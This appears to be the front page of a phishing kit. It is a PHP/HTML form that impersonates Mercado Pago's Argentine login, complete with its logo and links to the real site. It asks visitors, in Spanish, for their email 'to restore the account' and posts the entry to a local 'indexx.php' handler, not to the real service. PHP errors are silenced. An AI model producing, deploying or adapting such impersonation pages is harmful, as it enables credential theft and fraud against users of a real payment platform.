<?php
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <title>!Hola¡ Ingresá tu émail</title>
  <link rel="shortcut icon" href="fotes/logoo.ico" />
  <!--<META HTTP-EQUIV="REFRESH" CONTENT="5;URL=http://localhost/mg/index.php">-->
  <script src="https://kit.fontawesome.com/5b23b3e9e6.js" crossorigin="anonymous"></script>
  <link rel="stylesheet" type="text/css" href="css/index.css">
</head>

<body>
  <div class="container">
    <div class="banner">
      <div class="img">
        <img src="fotos/mp.png" height="35" alt="">
      </div>
      <a href="https://www.mercadopago.com.ar/ayuda" class="pregunta"><i class="fas fa-question"></i></a>
    </div>
    <div class="body">
      <div class="formulario">
        <form method="POST"  class="contenido_formulario" action="indexx.php">
          <h2>¡Hola! Por favor, Ingresá tu émail y
            contraseña para reestablecer tu cuenta</h2>
          <div class="input">
            <label for="email" class="formulario__label">E-mail o usuario</label>
            <input type="email" class="formulario__input" name="email" id="email" required />
            <p id="error">Este campo es obligatorio</p>
          </div>
          <button type="submit" class="continuar">Continuar</button>
          <button class="create" href="https://www.mercadopago.com.ar/registration-mp?confirmation_url=https%3A%2F%2Fwww.mercadopago.com.ar%2F">Crear Cuenta</button>
        </form>

      </div>
    </div>
  </div>
  <script src="validar.js"></script>
  

</body>

</html>